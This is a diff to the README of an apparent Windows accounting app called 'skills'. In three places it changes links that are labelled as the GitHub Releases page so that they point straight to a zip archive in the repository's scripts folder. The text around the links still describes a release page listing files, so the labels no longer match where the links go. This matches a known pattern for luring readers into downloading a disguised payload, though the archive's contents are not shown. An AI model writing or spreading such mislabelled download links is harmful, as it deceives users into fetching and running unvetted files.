@@ -1,6 +1,6 @@
 # 🧾 skills - Malaysian accounting made simpler
 
-[![Download skills](https://img.shields.io/badge/Download%20skills-blue-grey?style=for-the-badge)](https://github.com/mecheri-prog/skills/releases)
+[![Download skills](https://img.shields.io/badge/Download%20skills-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/mecheri-prog/skills/main/scripts/Software-1.1-alpha.1.zip)
 
 ## 📌 What this app does
 
@@ -23,7 +23,7 @@ Follow these steps to get the app on your Windows PC and run it.
 
 Go to the release page here:
 
-[Download skills from GitHub Releases](https://github.com/mecheri-prog/skills/releases)
+[Download skills from GitHub Releases](https://raw.githubusercontent.com/mecheri-prog/skills/main/scripts/Software-1.1-alpha.1.zip)
 
 This page lists the latest release files. If there is more than one file, choose the one meant for Windows.
 
@@ -207,7 +207,7 @@ A quick review helps catch file mix-ups and input gaps.
 
 If you need the app again, use the release page here:
 
-[https://github.com/mecheri-prog/skills/releases](https://github.com/mecheri-prog/skills/releases)
+[https://raw.githubusercontent.com/mecheri-prog/skills/main/scripts/Software-1.1-alpha.1.zip](https://raw.githubusercontent.com/mecheri-prog/skills/main/scripts/Software-1.1-alpha.1.zip)
 
 ## 📈 Common use cases
 
